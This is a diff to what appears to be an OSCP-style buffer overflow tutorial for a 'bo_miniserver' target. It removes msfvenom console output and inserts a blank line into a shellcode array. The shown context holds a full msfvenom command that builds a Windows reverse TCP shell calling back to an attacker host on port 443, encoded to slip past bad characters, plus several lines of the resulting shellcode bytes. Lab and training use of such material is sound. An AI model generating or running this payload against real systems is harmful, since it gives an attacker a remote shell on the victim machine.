@@ -138,13 +138,6 @@ Injecting a shellcode
 
     In the end, you are going to have a shellcode as the following one:
     *root@kali:~/oscp/bo_miniserver# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=443 -f  c –e x86/shikata_ga_nai -b "\x00\x0d"
-No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-No Arch selected, selecting Arch: x86 from the payload
-Found 10 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 351 (iteration=0)
-x86/shikata_ga_nai chosen with final size 351
-Payload size: 351 bytes
 Final size of c file: 1500 bytes
 unsigned char buf[] =
 "\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
@@ -195,6 +188,7 @@ shellcode = (
 "\xa4\x1b\xfa\x66\xa3\x2c\x89\x54\x6c\x87\x05\xd5\xe5\x01\xd2"
 "\x1a\xdc\xf6\x4c\xe5\xdf\x06\x45\x22\x8b\x56\xfd\x83\xb4\x3c"
 "\xfd\x2c\x61\x92\xad\x82\xda\x53\x1d\x63\x8b\x3b\x77\x6c\xf4"
+
 "\x5c\x78\xa6\x9d\xf7\x83\x21\x62\xaf\x8b\xb5\x0a\xb2\x8b\xb4"
 "\x71\x3b\x6d\xdc\x95\x6a\x26\x49\x0f\x37\xbc\xe8\xd0\xed\xb9"
 "\x2b\x5a\x02\x3e\xe5\xab\x6f\x2c\x92\x5b\x3a\x0e\x35\x63\x90"
